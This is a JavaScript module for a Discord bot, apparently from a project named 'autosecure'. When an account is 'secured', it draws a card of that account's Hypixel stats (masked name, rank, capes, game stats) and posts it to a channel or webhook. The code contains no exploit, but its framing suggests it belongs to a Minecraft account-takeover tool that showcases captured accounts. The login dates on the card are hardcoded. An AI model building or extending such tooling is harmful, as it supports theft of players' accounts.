const { EmbedBuilder, AttachmentBuilder } = require('discord.js');
const axios = require('axios');
const FormData = require('form-data');
const config = require('../../config.json');
const getStats = require('../../autosecure/utils/hypixelapi/getStats.js');
const fs = require('fs');
const path = require('path');
const { createCanvas, loadImage, registerFont } = require('canvas');

/**
 * Masks a player name with asterisks
 * @param {string} name
 */
function maskPlayerName(name) {
    if (!name || name.length <= 2) return name;
    const firstChar = name[0];
    const lastChar = name[name.length - 1];
    const asterisks = '*'.repeat(Math.max(name.length - 2, 1));
    return firstChar + asterisks + lastChar;
}

/**
 * Sends Hypixel stats to a configured channel when account is secured
 * @param {Object} client - Discord client
 * @param {Object} acc - Account object with newName (Minecraft username)
 * @param {string} userTag - User tag for logging
 */
async function sendStatsToChannel(client, acc, userTag) {
    try {
        // Diagnostics: incoming parameters
        console.log('[StatsChannel] Invocation:', { userTag: userTag || null, accNewName: acc?.newName || null });

        // Check if statsChannel is configured
        if (!config.statsChannel || typeof config.statsChannel !== 'string' || !/^\d{17,19}$/.test(config.statsChannel)) {
            console.log('[StatsChannel] Not configured or invalid ID.', { statsChannel: config.statsChannel });
            return;
        }

        // Don't send if no MC account
        if (!acc.newName || acc.newName === "No Minecraft!") {
            console.log('[StatsChannel] No Minecraft account to log stats for.');
            return;
        }

        // Try multiple retrieval methods and log results
        let channel = null;
        try {
            channel = client?.channels?.cache?.get?.(config.statsChannel) || null;
            console.log('[StatsChannel] channels.cache.get result:', !!channel);
        } catch (e) {
            console.warn('[StatsChannel] cache.get threw:', e && e.message);
        }
        if (!channel && client?.channels?.fetch) {
            try {
                channel = await client.channels.fetch(config.statsChannel).catch(() => null);
                console.log('[StatsChannel] channels.fetch result:', !!channel);
            } catch (e) {
                console.warn('[StatsChannel] channels.fetch threw:', e && e.message);
            }
        }

        if (!channel) {
            console.log('[StatsChannel] Channel not found or client has no access to it. ID:', config.statsChannel);
            // continue: we'll attempt to generate the image and send via webhook fallback if available
        }

        // Log basic channel capabilities
        try {
            console.log('[StatsChannel] Channel info:', { id: channel.id || null, isTextBased: typeof channel.send === 'function' });
        } catch (e) {
            console.log('[StatsChannel] Unable to read channel info:', e && e.message);
        }

        // Get player stats from Hypixel API
        let playerStats = null;
        try {
            playerStats = await getStats(acc.newName);
        } catch (statsErr) {
            console.warn('[StatsChannel] Failed to fetch stats:', statsErr.message || statsErr);
        }

        // Compose image from PNG template
        try {
                const templatePath = path.join(__dirname, '../../assets/stats_embed_mockup.png');

            console.log('[StatsChannel] Checking template at:', templatePath);
            if (fs.existsSync(templatePath)) {
                const template = await loadImage(templatePath);
                const width = 1522;
                const height = 856;
                const canvas = createCanvas(width, height);
                const ctx = canvas.getContext('2d');

                // Draw template background
                ctx.drawImage(template, 0, 0, width, height);

                // Apply strong blur effect to background
                ctx.filter = 'blur(50px)';
                ctx.drawImage(template, 0, 0, width, height);
                ctx.filter = 'none';
                
                // Add dark overlay to make background almost invisible
                ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
                ctx.fillRect(0, 0, width, height);

                // Draw rounded rectangle with padding
                const padding = 50;
                const cornerRadius = 30;
                const rectX = padding;
                const rectY = padding;
                const rectWidth = width - (padding * 2);
                const rectHeight = height - (padding * 2);
                
                // Fill semi-transparent background inside rectangle
                ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
                ctx.beginPath();
                ctx.moveTo(rectX + cornerRadius, rectY);
                ctx.lineTo(rectX + rectWidth - cornerRadius, rectY);
                ctx.quadraticCurveTo(rectX + rectWidth, rectY, rectX + rectWidth, rectY + cornerRadius);
                ctx.lineTo(rectX + rectWidth, rectY + rectHeight - cornerRadius);
                ctx.quadraticCurveTo(rectX + rectWidth, rectY + rectHeight, rectX + rectWidth - cornerRadius, rectY + rectHeight);
                ctx.lineTo(rectX + cornerRadius, rectY + rectHeight);
                ctx.quadraticCurveTo(rectX, rectY + rectHeight, rectX, rectY + rectHeight - cornerRadius);
                ctx.lineTo(rectX, rectY + cornerRadius);
                ctx.quadraticCurveTo(rectX, rectY, rectX + cornerRadius, rectY);
                ctx.fill();
                
                // Draw rounded rectangle border - BLACK (main container)
                ctx.strokeStyle = '#000000';
                ctx.lineWidth = 6;
                ctx.beginPath();
                ctx.moveTo(rectX + cornerRadius, rectY);
                ctx.lineTo(rectX + rectWidth - cornerRadius, rectY);
                ctx.quadraticCurveTo(rectX + rectWidth, rectY, rectX + rectWidth, rectY + cornerRadius);
                ctx.lineTo(rectX + rectWidth, rectY + rectHeight - cornerRadius);
                ctx.quadraticCurveTo(rectX + rectWidth, rectY + rectHeight, rectX + rectWidth - cornerRadius, rectY + rectHeight);
                ctx.lineTo(rectX + cornerRadius, rectY + rectHeight);
                ctx.quadraticCurveTo(rectX, rectY + rectHeight, rectX, rectY + rectHeight - cornerRadius);
                ctx.lineTo(rectX, rectY + cornerRadius);
                ctx.quadraticCurveTo(rectX, rectY, rectX + cornerRadius, rectY);
                ctx.stroke();

                // Draw AutoSecure Soon logo - at the bottom (white)
                ctx.shadowColor = 'rgba(0, 0, 0, 0.5)';
                ctx.shadowBlur = 15;
                ctx.shadowOffsetX = 2;
                ctx.shadowOffsetY = 2;
                ctx.fillStyle = '#FFFFFF';
                ctx.font = 'bold 50px Arial';
                ctx.textAlign = 'center';
                // Draw capes (if any) above the footer text
                try {
                    const capesList = Array.isArray(acc.capes) ? acc.capes : (acc.capes && typeof acc.capes === 'string' ? acc.capes.split(',').map(s=>s.trim()).filter(Boolean) : []);
                    if (capesList.length > 0) {
                        // icon sizing and layout
                        let iconSize = 64;
                        const spacing = 16;
                        const maxIcons = 8;
                        const displayCount = Math.min(capesList.length, maxIcons);
                        if (displayCount > 6) iconSize = 48;
                        const totalWidth = (iconSize * displayCount) + (spacing * (displayCount - 1));
                        let startX = Math.round((width - totalWidth) / 2);
                        const y = 720; // vertical position for cape icons

                        for (let i = 0; i < displayCount; i++) {
                            const raw = capesList[i];
                            const x = startX + i * (iconSize + spacing);
                            let drawn = false;

                            // If the entry looks like a URL, try to load it
                            if (typeof raw === 'string' && /^https?:\/\//i.test(raw)) {
                                try {
                                    const img = await loadImage(raw);
                                    ctx.drawImage(img, x, y, iconSize, iconSize);
                                    drawn = true;
                                } catch (e) {
                                    // fallback to badge
                                    drawn = false;
                                }
                            }

                            if (!drawn) {
                                // Draw a generated badge for the cape name
                                const name = String(raw || 'Cape');
                                // simple hash to generate color
                                let hash = 0; for (let j = 0; j < name.length; j++) hash = name.charCodeAt(j) + ((hash << 5) - hash);
                                const hue = Math.abs(hash) % 360;
                                ctx.fillStyle = `hsl(${hue} 70% 45%)`;
                                // rounded rect
                                const r = 12;
                                ctx.beginPath();
                                ctx.moveTo(x + r, y);
                                ctx.lineTo(x + iconSize - r, y);
                                ctx.quadraticCurveTo(x + iconSize, y, x + iconSize, y + r);
                                ctx.lineTo(x + iconSize, y + iconSize - r);
                                ctx.quadraticCurveTo(x + iconSize, y + iconSize, x + iconSize - r, y + iconSize);
                                ctx.lineTo(x + r, y + iconSize);
                                ctx.quadraticCurveTo(x, y + iconSize, x, y + iconSize - r);
                                ctx.lineTo(x, y + r);
                                ctx.quadraticCurveTo(x, y, x + r, y);
                                ctx.fill();

                                // draw initials
                                const initials = name.split(/[^A-Za-z0-9]+/).filter(Boolean).map(p=>p[0]).slice(0,2).join('').toUpperCase();
                                ctx.fillStyle = 'rgba(255,255,255,0.95)';
                                ctx.font = `${Math.round(iconSize/2.8)}px Arial`;
                                ctx.textAlign = 'center';
                                ctx.textBaseline = 'middle';
                                ctx.fillText(initials, x + iconSize/2, y + iconSize/2 - 4);

                                // small label under badge (optional small text)
                                ctx.font = '12px Arial';
                                ctx.fillStyle = '#FFFFFF';
                                ctx.textAlign = 'center';
                                ctx.textBaseline = 'top';
                                const label = name.length > 10 ? name.slice(0,9) + '…' : name;
                                ctx.fillText(label, x + iconSize/2, y + iconSize + 6);
                            }
                        }
                    }
                } catch (e) {
                    console.warn('[StatsChannel] Failed to draw capes:', e && e.message ? e.message : e);
                }

                ctx.fillText('AutoSecure Soon', width / 2, 780);
                ctx.textAlign = 'left';
                ctx.shadowColor = 'rgba(0,0,0,0)';
                ctx.shadowBlur = 0;

                // Get masked name
                const maskedName = maskPlayerName(acc.newName);

                // Prepare display text: either "RANK (maskedName)" or just the maskedName
                try {
                    let displayRank = null;
                    if (playerStats) {
                        if (playerStats.rank) displayRank = playerStats.rank;
                        else if (playerStats.player && playerStats.player.rank) displayRank = playerStats.player.rank;
                    }
                    let nameLine = maskedName;
                    let hasRank = false;
                    if (displayRank && displayRank !== 'None') {
                        nameLine = `${displayRank} (${maskedName})`;
                        hasRank = true;
                    }

                    // Draw the combined line centered
                    ctx.shadowColor = 'rgba(0, 0, 0, 0.6)';
                    ctx.shadowBlur = 15;
                    ctx.shadowOffsetX = 2;
                    ctx.shadowOffsetY = 2;
                    ctx.fillStyle = hasRank ? '#FFD700' : '#FFFFFF';
                    ctx.font = 'bold 48px Arial';
                    ctx.textAlign = 'center';
                    ctx.fillText(nameLine, width / 2, rectY + 60);
                    ctx.textAlign = 'left';
                    ctx.shadowColor = 'rgba(0,0,0,0)';
                    ctx.shadowBlur = 0;
                    ctx.fillStyle = '#FFFFFF';
                } catch (e) {
                    // fallback to plain masked name
                    ctx.font = 'bold 48px Arial';
                    ctx.fillStyle = '#FFFFFF';
                    ctx.textAlign = 'center';
                    ctx.fillText(maskedName, width / 2, rectY + 60);
                    ctx.textAlign = 'left';
                }

                // Draw player thumbnail (bust) - left side, centered vertically
                try {
                    const thumbUrl = `https://visage.surgeplay.com/bust/512/${encodeURIComponent(acc.newName)}.png?y=-40&quality=lossless`;
                    const thumb = await loadImage(thumbUrl);
                    ctx.drawImage(thumb, 70, 318, 220, 220);
                } catch (thumbErr) {
                    console.warn('[StatsChannel] Failed to load thumbnail:', thumbErr.message || thumbErr);
                }

                // Draw player name at top right with glow effect - inside rectangle
                ctx.shadowColor = 'rgba(255, 215, 0, 0.8)';
                ctx.shadowBlur = 15;
                ctx.shadowOffsetX = 2;
                ctx.shadowOffsetY = 2;
                ctx.fillStyle = '#FFD700';
                ctx.font = '20px Arial';
                ctx.textAlign = 'right';
                ctx.fillText('First Login: 6/20/2025, 4:14:16 AM', width - padding - 30, 90);

                ctx.shadowColor = 'rgba(0,0,0,0)';
                ctx.shadowBlur = 0;
                ctx.fillStyle = '#FFFFFF';
                ctx.font = '20px Arial';
                ctx.fillText('Last Login: 9/9/2025, 8:02:46 AM', width - padding - 30, 120);
                
                ctx.textAlign = 'left';

                // Extract stats for display
                let skyblockLevel = 0;
                let skyblockNetWorth = 0;
                let skyblockSkillAverage = 0;
                let skyblockCatacombs = 0;
                let skyblockCoopMembers = 0;

                let bedwarsStars = 0;
                let bedwarsFKDR = 0;
                let bedwarsWinstreak = 0;

                let networkLevel = 0;
                let networkProgress = 0;

                let duelsWins = 0;
                let duelKills = 0;
                let duelsLosses = 0;

                let skywarsStars = 0;
                let skywarsKills = 0;
                let skywarsDeaths = 0;

                if (playerStats && playerStats.success) {
                    const stats = playerStats.player || {};
                    const skyblock = stats.stats?.SkyBlock || {};
                    const bedwars = stats.stats?.Bedwars || {};
                    const duels = stats.stats?.Duels || {};
                    const skywars = stats.stats?.SkyWars || {};
                    
                    networkLevel = Math.floor(stats.networkLevel || 0);
                    networkProgress = Math.floor((stats.networkExp || 0) % 5000);

                    // Skyblock stats
                    if (skyblock.profiles) {
                        const profileKeys = Object.keys(skyblock.profiles);
                        if (profileKeys.length > 0) {
                            const latestProfile = skyblock.profiles[profileKeys[profileKeys.length - 1]];
                            skyblockLevel = Math.floor((latestProfile.level || 0));
                            skyblockNetWorth = latestProfile.networth || 0;
                        }
                    }

                    // Bedwars stats
                    bedwarsStars = Math.floor(bedwars.level || 0);
                    bedwarsFKDR = (bedwars.final_kills_bedwars || 0) / Math.max(bedwars.final_deaths_bedwars || 1, 1);
                    bedwarsWinstreak = bedwars.winstreak || 0;

                    // Duels stats
                    duelsWins = duels.wins || 0;
                    duelKills = duels.kills || 0;
                    duelsLosses = duels.losses || 0;

                    // Skywars stats
                    skywarsStars = Math.floor(skywars.level || 0);
                    skywarsKills = skywars.kills || 0;
                    skywarsDeaths = skywars.deaths || 0;
                }

                // Draw Skyblock box with rounded corners
                const skyblockRadius = 15;
                ctx.fillStyle = 'rgba(100, 50, 100, 0.3)';
                ctx.beginPath();
                ctx.moveTo(430 + skyblockRadius, 160);
                ctx.lineTo(430 + 310 - skyblockRadius, 160);
                ctx.quadraticCurveTo(430 + 310, 160, 430 + 310, 160 + skyblockRadius);
                ctx.lineTo(430 + 310, 160 + 220 - skyblockRadius);
                ctx.quadraticCurveTo(430 + 310, 160 + 220, 430 + 310 - skyblockRadius, 160 + 220);
                ctx.lineTo(430 + skyblockRadius, 160 + 220);
                ctx.quadraticCurveTo(430, 160 + 220, 430, 160 + 220 - skyblockRadius);
                ctx.lineTo(430, 160 + skyblockRadius);
                ctx.quadraticCurveTo(430, 160, 430 + skyblockRadius, 160);
                ctx.fill();
                ctx.strokeStyle = '#00BFFF';
                ctx.lineWidth = 2;
                ctx.stroke();

                ctx.fillStyle = '#FFFFFF';
                ctx.font = 'bold 28px Arial';
                ctx.fillText('Skyblock', 450, 205);
                ctx.font = '18px Arial';
                ctx.fillStyle = '#00BFFF';
                ctx.fillText(`Skyblock Level: ${skyblockLevel}`, 450, 235);
                ctx.fillStyle = '#FFD700';
                ctx.fillText(`Net Worth: ${skyblockNetWorth > 0 ? (skyblockNetWorth / 1e9).toFixed(2) + 'B' : '0'}`, 450, 265);
                ctx.fillStyle = '#90EE90';
                ctx.fillText(`Skill Average: ${skyblockSkillAverage}`, 450, 295);
                ctx.fillStyle = '#FF6347';
                ctx.fillText(`Catacombs: ${skyblockCatacombs}`, 450, 325);
                ctx.fillStyle = '#DDA0DD';
                ctx.fillText(`Coop Members: ${skyblockCoopMembers}`, 450, 355);

                // Draw Network Level box with rounded corners
                const networkRadius = 15;
                ctx.fillStyle = 'rgba(50, 100, 100, 0.3)';
                ctx.beginPath();
                ctx.moveTo(790 + networkRadius, 160);
                ctx.lineTo(790 + 310 - networkRadius, 160);
                ctx.quadraticCurveTo(790 + 310, 160, 790 + 310, 160 + networkRadius);
                ctx.lineTo(790 + 310, 160 + 220 - networkRadius);
                ctx.quadraticCurveTo(790 + 310, 160 + 220, 790 + 310 - networkRadius, 160 + 220);
                ctx.lineTo(790 + networkRadius, 160 + 220);
                ctx.quadraticCurveTo(790, 160 + 220, 790, 160 + 220 - networkRadius);
                ctx.lineTo(790, 160 + networkRadius);
                ctx.quadraticCurveTo(790, 160, 790 + networkRadius, 160);
                ctx.fill();
                ctx.strokeStyle = '#87CEEB';
                ctx.lineWidth = 2;
                ctx.stroke();

                ctx.fillStyle = '#FFFFFF';
                ctx.font = 'bold 28px Arial';
                ctx.fillText('Network Level', 810, 205);
                ctx.font = '20px Arial';
                ctx.fillStyle = '#FFFFFF';
                ctx.fillText(`LVL: ${networkLevel}`, 810, 245);
                ctx.fillStyle = '#87CEEB';
                ctx.fillText(`${networkProgress} / 10,000`, 810, 275);
                
                // Draw progress bar
                const barWidth = 250;
                const barHeight = 20;
                const barX = 810;
                const barY = 295;
                ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
                ctx.fillRect(barX, barY, barWidth, barHeight);
                ctx.fillStyle = '#00BFFF';
                ctx.fillRect(barX, barY, (networkProgress / 10000) * barWidth, barHeight);

                // Draw Skywars box with rounded corners
                const skywarsRadius = 15;
                ctx.fillStyle = 'rgba(50, 50, 100, 0.3)';
                ctx.beginPath();
                ctx.moveTo(1150 + skywarsRadius, 160);
                ctx.lineTo(1150 + 310 - skywarsRadius, 160);
                ctx.quadraticCurveTo(1150 + 310, 160, 1150 + 310, 160 + skywarsRadius);
                ctx.lineTo(1150 + 310, 160 + 220 - skywarsRadius);
                ctx.quadraticCurveTo(1150 + 310, 160 + 220, 1150 + 310 - skywarsRadius, 160 + 220);
                ctx.lineTo(1150 + skywarsRadius, 160 + 220);
                ctx.quadraticCurveTo(1150, 160 + 220, 1150, 160 + 220 - skywarsRadius);
                ctx.lineTo(1150, 160 + skywarsRadius);
                ctx.quadraticCurveTo(1150, 160, 1150 + skywarsRadius, 160);
                ctx.fill();
                ctx.strokeStyle = '#32CD32';
                ctx.lineWidth = 2;
                ctx.stroke();

                ctx.fillStyle = '#FFFFFF';
                ctx.font = 'bold 28px Arial';
                ctx.fillText('Skywars', 1170, 205);
                ctx.font = '18px Arial';
                ctx.fillStyle = '#32CD32';
                ctx.fillText(`Stars: ${skywarsStars}`, 1170, 235);
                ctx.fillStyle = '#90EE90';
                ctx.fillText(`Kills: ${skywarsKills}`, 1170, 265);
                ctx.fillStyle = '#FFD700';
                ctx.fillText(`Deaths: ${skywarsDeaths}`, 1170, 295);

                // Draw Bedwars box with rounded corners
                const bedwarsRadius = 15;
                ctx.fillStyle = 'rgba(100, 50, 50, 0.3)';
                ctx.beginPath();
                ctx.moveTo(430 + bedwarsRadius, 420);
                ctx.lineTo(430 + 310 - bedwarsRadius, 420);
                ctx.quadraticCurveTo(430 + 310, 420, 430 + 310, 420 + bedwarsRadius);
                ctx.lineTo(430 + 310, 420 + 220 - bedwarsRadius);
                ctx.quadraticCurveTo(430 + 310, 420 + 220, 430 + 310 - bedwarsRadius, 420 + 220);
                ctx.lineTo(430 + bedwarsRadius, 420 + 220);
                ctx.quadraticCurveTo(430, 420 + 220, 430, 420 + 220 - bedwarsRadius);
                ctx.lineTo(430, 420 + bedwarsRadius);
                ctx.quadraticCurveTo(430, 420, 430 + bedwarsRadius, 420);
                ctx.fill();
                ctx.strokeStyle = '#FF6347';
                ctx.lineWidth = 2;
                ctx.stroke();

                ctx.fillStyle = '#FFFFFF';
                ctx.font = 'bold 28px Arial';
                ctx.fillText('Bedwars', 450, 465);
                ctx.font = '18px Arial';
                ctx.fillStyle = '#00BFFF';
                ctx.fillText(`Stars: ${bedwarsStars}`, 450, 495);
                ctx.fillStyle = '#FF6347';
                ctx.fillText(`FKDR: ${bedwarsFKDR.toFixed(2)}`, 450, 525);
                ctx.fillStyle = '#FFD700';
                ctx.fillText(`Winstreak: ${bedwarsWinstreak}`, 450, 555);

                // Draw Duels box with rounded corners
                const duelsRadius = 15;
                ctx.fillStyle = 'rgba(50, 100, 50, 0.3)';
                ctx.beginPath();
                ctx.moveTo(790 + duelsRadius, 420);
                ctx.lineTo(790 + 310 - duelsRadius, 420);
                ctx.quadraticCurveTo(790 + 310, 420, 790 + 310, 420 + duelsRadius);
                ctx.lineTo(790 + 310, 420 + 220 - duelsRadius);
                ctx.quadraticCurveTo(790 + 310, 420 + 220, 790 + 310 - duelsRadius, 420 + 220);
                ctx.lineTo(790 + duelsRadius, 420 + 220);
                ctx.quadraticCurveTo(790, 420 + 220, 790, 420 + 220 - duelsRadius);
                ctx.lineTo(790, 420 + duelsRadius);
                ctx.quadraticCurveTo(790, 420, 790 + duelsRadius, 420);
                ctx.fill();
                ctx.strokeStyle = '#FFD700';
                ctx.lineWidth = 2;
                ctx.stroke();

                ctx.fillStyle = '#FFFFFF';
                ctx.font = 'bold 28px Arial';
                ctx.fillText('Duels', 810, 465);
                ctx.font = '18px Arial';
                ctx.fillStyle = '#87CEEB';
                ctx.fillText(`Wins: ${duelsWins}`, 810, 495);
                ctx.fillStyle = '#90EE90';
                ctx.fillText(`Kills: ${duelKills}`, 810, 525);
                ctx.fillStyle = '#FF6347';
                ctx.fillText(`Losses: ${duelsLosses}`, 810, 555);

                // Convert canvas to buffer and send
                const buffer = canvas.toBuffer('image/png');
                console.log('[StatsChannel] Generated image buffer length:', buffer.length);
                const attachment = new AttachmentBuilder(buffer, { name: 'stats.png' });

                if (channel) {
                    try {
                        await channel.send({ files: [attachment] });
                        console.log('[StatsChannel] Message send succeeded.');
                    } catch (sendErr) {
                        console.error('[StatsChannel] Failed to send message:', sendErr && (sendErr.message || sendErr));
                        // attempt webhook fallback
                        await trySendViaWebhook(buffer, acc.newName).catch(e => console.error('[StatsChannel] Webhook fallback failed:', e && e.message));
                    }
                } else {
                    // no channel available, attempt webhook fallback
                    await trySendViaWebhook(buffer, acc.newName).catch(e => console.error('[StatsChannel] Webhook fallback failed:', e && e.message));
                }
            } else {
                console.log('[StatsChannel] Template not found at:', templatePath);
            }

        } catch (err) {
            console.error('[StatsChannel] Error creating stats image:', err.message);
        }

        console.log(`[StatsChannel] Stats sent for ${acc.newName}`);

    async function trySendViaWebhook(buffer, name) {
        try {
            const webhookUrl = config.notifierWebhook || config.dashboard?.notifierWebhook;
            if (!webhookUrl) {
                throw new Error('No notifier webhook configured');
            }

            const form = new FormData();
            form.append('file', buffer, { filename: 'stats.png' });

            const payload = {
                content: `Stats for ${name}`
            };
            form.append('payload_json', JSON.stringify(payload));

            const headers = form.getHeaders();
            console.log('[StatsChannel] Sending webhook fallback to:', webhookUrl);
            const res = await axios.post(webhookUrl, form, { headers, maxBodyLength: Infinity });
            console.log('[StatsChannel] Webhook fallback response status:', res.status);
            return true;
        } catch (e) {
            console.error('[StatsChannel] Webhook fallback error:', e && (e.message || e));
            throw e;
        }
    }

    } catch (error) {
        console.error('[StatsChannel] Error in sendStatsToChannel:', error);
    }
}

module.exports = sendStatsToChannel;
